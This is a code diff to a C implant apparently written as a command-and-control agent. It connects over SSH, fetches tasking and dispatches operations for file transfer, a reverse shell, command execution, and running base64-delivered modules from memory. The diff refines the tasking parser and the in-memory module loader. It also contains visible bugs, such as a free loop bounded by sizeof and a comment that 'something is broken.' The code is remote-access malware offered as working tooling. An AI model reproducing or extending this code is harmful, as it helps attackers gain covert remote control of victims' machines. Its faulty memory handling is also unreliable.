@@ -100,8 +100,11 @@ int exec_module(ssh_channel channel, char *module){
 	int rc = 0;
 	int nbytes = 0;
 	int exit_status = 0;
+	int size = 0;
+	int finSize = 0;
 	char *buff;
-	char buffr[128];
+	char *ptrFin;
+	char buffr[BUFSIZ];
 	
 	memset(buffr, 0, sizeof(buffr));
 	sprintf(buffr, "14|%s", module);
@@ -128,7 +131,7 @@ int exec_module(ssh_channel channel, char *module){
     	return SSH_ERROR;
 	}	
 
-	rc = ssh_channel_write(channel, "0", 1);
+	rc = ssh_channel_write(channel, "ok", 3);
 	if (rc == SSH_ERROR){
 		printf("Caught ssh error: %s\n", ssh_get_error(channel));
 		ssh_channel_close(channel);
@@ -137,7 +140,7 @@ int exec_module(ssh_channel channel, char *module){
 	}
 
 	// convert size to integer and allocate memory
-	int size = atoi(buffr);
+	size = atoi(buffr);
 	printf("%s, %d\n", buffr, size);
 
 	buff = malloc(size+1);
@@ -146,8 +149,8 @@ int exec_module(ssh_channel channel, char *module){
 	// read file from channel and decode
 	rc = ssh_channel_read(channel, buff, size, 0);
 	
-	int finSize = b64_decoded_size(buff);
-	char *ptrFin = malloc(finSize+1);
+	finSize = b64_decoded_size(buff);
+	ptrFin = malloc(finSize+1);
 	memset(ptrFin, 0, finSize+1);
 
 	
@@ -156,14 +159,15 @@ int exec_module(ssh_channel channel, char *module){
 		return SSH_ERROR;
 	}
 
+	free(buff);
+
 	// execute file from memory
 	exit_status = do_exec(ptrFin, size);
 	memset(buffr, 0, sizeof(buffr));
 	sprintf(buffr, "%d", exit_status);
 
 	ssh_channel_write(channel, buffr, 2);
-	free(buff);
-	free(ptrFin);
+	//free(ptrFin);
 	return 0;
 }
 #endif
@@ -185,8 +189,6 @@ int func_loop(ssh_session session)
   	ssh_channel channel;
   	int rc;
 	char tasking[2048];
-	char tmp[3];
-	tmp[2] = '\0';  
 	int nbytes;
 
 	memset(tasking, 0, sizeof(tasking));
@@ -225,8 +227,6 @@ int func_loop(ssh_session session)
 	printf("Identified as an agent\n");
 	rc = ssh_channel_write(channel, "1", 2);
 
-	ssh_channel_read(channel, tmp, 2, 0);
-	
 	printf("Waiting for read...\n");
 	nbytes = ssh_channel_read(channel, tasking, sizeof(tasking), 0);
 	printf("read %d bytes from channel\n", nbytes);
@@ -241,11 +241,23 @@ int func_loop(ssh_session session)
 	parse_tasking(tasking, channel);
 	
 	  // close connections
-	ssh_channel_write(channel, "0", 2);
+	rc = ssh_channel_write(channel, "0", 2);
+	if (rc == SSH_ERROR){
+		printf("Caught ssh error: %s\n", ssh_get_error(channel));
+		ssh_channel_close(channel);
+    	ssh_channel_free(channel);
+    	return SSH_ERROR;
+	}
 
-  	ssh_channel_send_eof(channel);
-  	ssh_channel_close(channel);
-  	ssh_channel_free(channel);
+	rc = ssh_channel_close(channel);
+	if (rc == SSH_ERROR){
+		printf("Caught ssh error: %s\n", ssh_get_error(channel));
+		ssh_channel_free(channel);
+    	return rc;
+	}  
+
+	ssh_channel_free(channel);
+	  
   	return SSH_OK;
 }
 
@@ -253,20 +265,23 @@ int parse_tasking(char *tasking, ssh_channel chan){
 	/* Parses and handles the tasking input from the server*/
 
 	// checks if there is no tasking
-	if(!strcmp(tasking, "default\n")){
+	if(!strncmp(tasking, "default", 7)){
 		printf("No tasking available. Quitting...\n");
 		ssh_channel_write(chan, "0", 2);
-		return 1;
+		return 0;
 	}
 
 
 	// get the number of instructions to complete
 	int num = 0;
 	char *tmp = tasking;
+	char *dat = NULL;
+	char tmpbf[3];
+
 	for (; tasking[num]; tasking[num]=='\n' ? num++ : *tasking++);
 	tasking = tmp;
 	printf("Number of tasks to do: %d\n", num);
-	struct tasking_struct tasking_arr[num];
+	struct tasking_struct *tasking_arr[num];
 
 	char *p = strtok(tasking, "\n");
 	printf("Filling the structure array\n");
@@ -276,17 +291,16 @@ int parse_tasking(char *tasking, ssh_channel chan){
 	while(p != NULL)
 	{
 		// get operation int
-		char tmpbf[3];
-		tmpbf[2] ='\0';
+		memset(tmpbf, 0, sizeof(tmpbf));
 		strncat(tmpbf, p, 2);
-		tasking_arr[i].operation = atoi(tmpbf);
+		struct tasking_struct *curr = malloc(sizeof(struct tasking_struct));
+		curr->operation = atoi(tmpbf);
+		//tasking_arr[i].operation = atoi(tmpbf);
 
 		// get options for operation
-		int sz = strlen(p+3);
-		char *dat = malloc(sz);
-		memset(dat, 0, sz);
-		strcat(dat, p+3);
-		tasking_arr[i].opts = dat;
+		dat = strdup(p+3);
+		curr->opts = dat;
+		tasking_arr[i] = curr;
 
 		// clean up and move on
 		p = strtok(NULL, "\n");
@@ -295,10 +309,10 @@ int parse_tasking(char *tasking, ssh_channel chan){
 	}
 
 	for(int j = 0; j < num; j++){
-		switch(tasking_arr[j].operation)
+		switch(tasking_arr[j]->operation)
 		{
 		case AGENT_DOWN_FILE:
-			printf("Got tasking to download file %s\n", tasking_arr[j].opts);
+			printf("Got tasking to download file %s\n", tasking_arr[j]->opts);
 			//rc = download(tasking_arr[j].opts);
 			//ssh_channel_write(chan, )
 			break;
@@ -306,14 +320,14 @@ int parse_tasking(char *tasking, ssh_channel chan){
 			printf("Got tasking to start reverse shell\n");
 			break;
 		case AGENT_UP_FILE:
-			printf("Got tasking to upload file %s\n", tasking_arr[j].opts);
+			printf("Got tasking to upload file %s\n", tasking_arr[j]->opts);
 			break;
 		case AGENT_EXEC_SC:
-			printf("Got tasking to execute command %s\n", tasking_arr[j].opts);
+			printf("Got tasking to execute command %s\n", tasking_arr[j]->opts);
 			break;
 		case AGENT_EXEC_MODULE:
-			printf("Got tasking to execute module %s\n", tasking_arr[j].opts);
-			exec_module(chan, tasking_arr[j].opts);
+			printf("Got tasking to execute module %s\n", tasking_arr[j]->opts);
+			exec_module(chan, tasking_arr[j]->opts);
 			
 			break;
 
@@ -322,7 +336,7 @@ int parse_tasking(char *tasking, ssh_channel chan){
 			break;
 
 		default:
-			printf("Caught unknown tasking value: %d\n", tasking_arr[j].operation);
+			printf("Caught unknown tasking value: %d\n", tasking_arr[j]->operation);
 			break;
 		}
 	
@@ -330,8 +344,13 @@ int parse_tasking(char *tasking, ssh_channel chan){
 
 	// free all stuff
 	for(int k = 0; k < sizeof(tasking_arr); k++){
-		free(tasking_arr[k].opts);
+		// Something is broken in here
+		printf("Freeing shit\n");
+		if(tasking_arr[k] == NULL) continue;
+		free(tasking_arr[k]->opts);
+		free(tasking_arr[k]);
 	}
+	printf("Finished freeing shit\n");
 	return 0;
 }
 
